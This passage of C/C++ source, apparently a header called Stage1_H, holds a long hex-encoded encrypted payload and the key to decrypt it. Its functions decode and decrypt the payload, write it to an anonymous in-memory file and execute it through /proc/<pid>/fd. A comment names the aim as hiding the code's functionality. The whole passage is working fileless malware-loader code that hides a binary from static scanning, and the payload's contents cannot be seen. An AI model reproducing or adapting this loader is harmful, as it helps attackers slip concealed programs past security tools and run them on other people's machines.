616e75616b4171796a7d61887579ab6370796a6d616e75616b6370796a50626e75716b7d7089aa6d616e75616b6370796a6d616e75506c63708b6a6d616e75616b6370796a6d616e75616b63708c6c6d618075616b6370796a6d616e75616b6370796a6d619277616b8370796a6d616e75616b6370796a6d616e75616ba372796a8d616e75616b6370796a6d616e75616b6370796abc636e75816b6370796a6d616e75616b6370796a6d616e75ca6d63708b6a6d616e75616b6370796a6d616e75616b637079bdd0d3e2a68fda63cfd8cbcfcacde9c2d263d3ebdee0d5e3dbc799c670ddcfdfc6d5ded4dfc8e2d8dedac0d1e1d0d9c8e379c9ccc5ddd4c8d7d2d2dad6ccc5e2e4d3dec2d1eee26dc4dde2d1d7c8e4dece9b916ed4c0cfd2cfe0d6dcc3cfe1c0cfd7dfebddccc2e3edc0d1ccdee2c9ced3e0d6dacac8deeddce661d4e7c2d8c8cfdddfdacee775c0cac9e2dad7d2c0d2eaced8dccfe2d8d6d5cdd6d3ddc4e9d8cfdbd5e0ee61dfc4e2e0cfe18fd1e5d16bc2caccdeb999cdd4cadaccdee2de6dc0c8a992cac2e3edcbe1cad1d4cad9cce4e2cbd9cae8d6d5d4d2ded8cbdbc5cdd9c6ded7e2eecde1cadde3c09bccd979c9b4adbdb7a2b7c2cfecdfcfc0b7d4ceccccde79c9cca7c0b6aeb0c2b5c7aeccc06ed4c0b2b1c5d8afb5c0b4c7a2b8a8cfc1aebf61cdb9bab9a4bdc2ad6dc0b5c1b0ada4bcd8b9b3a7c1bab5cab7b1bbb6b2c06ed4c6cfc4e4da6accaabdd4d4dfc7d9e7c9e2d4d3d961cac2d3f1cbccc7d7e3c2d7cceadeaab4adb7b7a4ca959eab98a261cdd4c5ded2cfe1cbdbc5dada61cac9d9e7d36dc0cde1cacdc6cfecdeced3e2d4ceccccdeb9b1b9aab0b8c09d91a3ad6accc0d1edc2cac4e4dee2d6d5aebcadb4a5b3d89c9b939caa61caccdee2de6dc0cdc9aeaec2b5c7aeccc06ed4c0cfc4e4dac9e0d5cfe7d56bc2d5e7ce6dc0cdd7d4dec2e3edcbdfd56ed4bbb9b6e4b1d3dcd4cdd7c2dec8a4c2d8d6d5b1a6a6e1a3b7c5b3afa4c6cdc09e91a479dae2d5e1b5a8b7acb2bcc99f8fa0a3966bc2b9cdb7ccc5d3e7c6d2cce3edcfdfb5bbb8cddad1d5cdcbcfcdd375c0cacadde8d8ccd4e2d6d3dfc2cf79c9b6b5bbd4d3d0cad9ecded2d3c2c2a4d7d2dedebecec3dada61cabdbeccdea5cadde8c0cdc4e3de9eb6cfd7e9a59ca8e6b9b1b9aab0b8b9c3c2a3a79e6d619ce8dad8d7d1db6a9bd4e2e7d5ccc570a7ddd5d4e2e7d5ccc570a7d3dbd5d3e7d16b91dee8ded28fd5e3d699d3e2e8dad2d3e2ee6199d1dfedcf9bc8dcea8fcdd8d9e5ce9acad2758fd9d2e4de98aea3b7a2d5ccca70a7d1dbd69cddc2decb70a7cee6cfe1eece6b91d4f2d8e0d5e0758fd2d1e5a7e0d2d3e1ded0d9639ee0d8e28fe4dad3deccdfe7c9df619ce7c6d7c49edde3db619ce7c6d7c49ee9d6e1619cdecfd4d770a7dad9d59cdcd0df639ee9d6e18fe1dac46b91e4dee2e1619cdbcad9cc70a7dcdcc5cfe9c26b91d5e1c9d3d3cfe2c6cacbd4eb6a9bc6d6d4c7ddc4ddde6a9bcadcded5cac4e2ebcbe6619cdbcad9cccfdadcdfc2e7758fcfdcdedad7d6c46ea3c5ccd7d17998cfd4e1758fced2dde6cfdbd56e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370946a6d616f75616b6570796a6d616e75796e6370796a6d618678616b6370796a89616e75616b6370796a6d616e75616b6470796a6d616e75616b6370796a6d619175616b6a70796a6f616e75616b6370b16d6d616e75616b9b73796a6d616e75916b6370796a6d616e75616b6370796a75616e75616b6370796a6d616e75616b9970796a74616e75636b6370796a6d61d678616b6370796ad5646e75616b63709d6a6d616e75616b6370796a6d616e75656b6370796a6d616e75616b6370796ab6616e75686b63707b6a6d616e75616bef73796a6d616e75ed6e6370796a6d618e75616b6370796a6d616e75616b63707d6a6d616e75616b6370796a6d616e75b86b63706f696cd07075616b6370796a1d646e75616b6370296d6d616e75616b8770796a6d616e75676b6370796a6d617675616b6370796a6d616e75616b6370da6a6d617975616b6570796a6d616e75396e6370796a6d614678616b6370796a5d616e75616b6370806a6d616f75616b6b70796a6d616e75796b6370796a6d61d775616b6670796a6f616e75616b6370416e6d616e75616b2b74796a6d616e75466b6370796a6d616e75616b6370796a6e616e75616b6370796a6d616e75616bd470796a6c606de4636b6370796a6d611c7a616b6370796a1b666e75616b63708d6a6d616e75616b6970796a6d616e75636b6370796a6d617075616b6370796aeb616e755f6a62df7b6a6d616e75616b2b75796a6d616e7529706370796a6d61be75616b6370796a74616e75636b6370816a6d616e75616b6370796a6d616e75ee6b63707d6a6d617075616b6370796a85676e75616b637091706d616e75616b5370796a6d616e75676b6370796a6d617675616b6370796a85616e75616b6370106a6d617275616ba570796a6d616e7569726370796a6d61767c616b6370796ab5616e75616b63707f6a6d618675616b6b70796a6d616e75796b6370796a6d610f75616b6470796a73616e75616b6370797a6d616e75616b6380796a6d616e757c6b6370796a6d616e75616b6370796a71616e75616b6370796a6d616e75616bff70796a6e616e75676b6370796a6d618e85616b6370796a8d716e75616b6370b96a6d616e75616b6370796a6d616e75716b6370796a6d617e75616b6370796a14616e75626b63707f6a6d616e75616bc380796a6d616e75c17b6370796a6d617e75616b6370796a6d616e75616b6370896a6d616e75616b7370796a6d616e75116b63707a6a6d617475616b6370796add716e75616b6370e97a6d616e75616b9370796a6d616e75616b6370796a6d617e75616b6370796a7d616e75616b6370326a6d616f75616b6970796a6d616e75017b6370796a6d610e85616b6370796aee626e75616b6370796a6d616e75616b7370796a6d616e75616b6370796a6d612d75616b6470796a73616e75616b63709d7c6d616e75616b8782796a6d616e756e6b6370796a6d616e75616b6370796a71616e75616b6370796a6d616e75616b2870796a6e616e75636b6370796a6d616e95616b6370796a6d816e75616b6370ac6a6d616e75616b6370796a6d616e75696b6370796a6d616e75616b6370796a3a616e75626b63707b6a6d616e75616b9790796a6d616e75958b6370796a6d61b275616b6370796a6d616e75616b63707d6a6d616e75616b6370796a6d616e753c6b63707a6a6d617075616b6370796ae5816e75616b6370f18a6d616e75616b4f70796a6d616e75616b6370796a6d617675616b6370796a6d616e75616b63705e6a6d617c75616b6670796a6d616e75e9a86370796a6d61f6a2616b6370796a7d616e75616b6370796a6d616e75616b6b70796a6d616e75696b6370796a6d615f75616b7270796a70616e75616b637011a76d616e75616bfb9d796a6d616e75696b6370796a6d616e75616b6370796a75616e75616b6370816a6d616e75616b6070796a73616e75646b6370796a6d610eb2616b6370796a0d8e6e75616b6370796c6d616e75616b6a70796a6d616e75696b6370796a6d617e75616b6370796a18616e75626b63707c6a6d616e75616b03af796a6d616e75019a6370796a6d61ce75616b6370796a6d616e75616b6370816a6d616e75616b6b70796a6d616e75676c63707a6a6d617175616b6370796a6da16e75616b6370799a6d616e75616b7370796a6d616e75616b6370796a6d617675616b6370796a6d616e75616b6370856b6d617675616b6670796a6d616e7571ab6370796a6d617ea5616b6370796a75616e75616b6370796a6d616e75616b6470796a6d616e75616b6370796a6d617f76616b6470796a9d616e75616b6370796a6d616e75616b73a0796a6d616e75876b6370796a6d616e75616b6370796a6e616e75616b63707a6a6d616e75616b6470796a6f616e75616b6370796a6d616e75616b6370796aa5916e75616b6370696d6d616e75616b8070796a82616e75696b6370796a6d618675616b6370796a76616e75646b6370796a6d616e75616b6370796a6d616e75899f6370796a6d61fb77616b6370796a6d616e75616b63707a6a6d616e75616b6370796a6d616e75726b63707c6a6d616e75616b6370796a6d616e75616b63702ea06d616e75616b7d71796a6d616e75616b6370796a6d616f75616b6370796a6d616e75616b6370";
SECRET char key[] = "cpyjmanuak";

// The code functionality to hide.
CRYPTED int stub() {/* Marker for top of section */}

CRYPTED unsigned char* decodePayload() {
    unsigned char* decoded = new unsigned char[sizeof(codedPayload) / 2];

    int j = 0;
    for (int i = 0; i < sizeof(codedPayload); i += 2) {
        
        char byte[] = {codedPayload[i], codedPayload[i +1]};
        decoded[j] = (char)strtol(byte, 0, +16);
        j++;
    }
    return decoded;
}

CRYPTED unsigned char* decryptPayload() {

    unsigned char* payload = decodePayload();
    unsigned char* decrypted = new unsigned char[sizeof(codedPayload) /2];

    for (int i = 0; i < sizeof(codedPayload) /2; i++) {
        decrypted[i] = payload[i] - key[i % 10];
    }

    return decrypted;
}

CRYPTED bool executePayload() {

    // First decrypt payload.
    unsigned char* decrypted = decryptPayload();
    if (decrypted == NULL) {
        printf("Failed to decrypt payload!\n");
        return false;
    }
    
    // Write decrypted payload to memory description. 
    int fd = anonFile("a", 1);
    write(fd, decrypted, sizeof(codedPayload) /2);

    // Assemble new path.
    char path[1024];
    snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), fd);

    // Create new proccess with the binary.
    printf("Executing actual binary now...[%s]\n", path);

    if (execv(path, NULL) == -1) {
        printf("Failed to execute binary! Code: %d\n", errno);
        return 1;
    }

    return true;
}

#endif //!~ Stage1_H
 
